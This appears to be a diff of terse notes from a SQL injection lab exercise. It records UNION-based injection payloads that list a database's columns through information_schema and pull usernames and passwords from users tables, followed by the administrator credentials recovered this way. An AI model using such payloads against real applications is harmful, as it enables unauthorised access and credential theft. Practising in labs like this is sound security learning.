@@ -31,6 +31,12 @@ Ananlysis:
 ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_xacgsm' --
 
 
+table--: users_fpoczf
+
+username_kcdfqm
+password_hrcklk
+
+
 username_pxqwui
 password_bfvoxs
 
@@ -38,7 +44,12 @@ password_bfvoxs
 
 ' UNION select username_pxqwui, password_bfvoxs from users_xacgsm --
 
+' UNION select username_kcdfqm,password_hrcklk from users_fpoczf --
+
 administator
 9g91jpytvv5c091xpjxc
 
+
+administrator
+ndio9kinq8k4vxgdz840
 
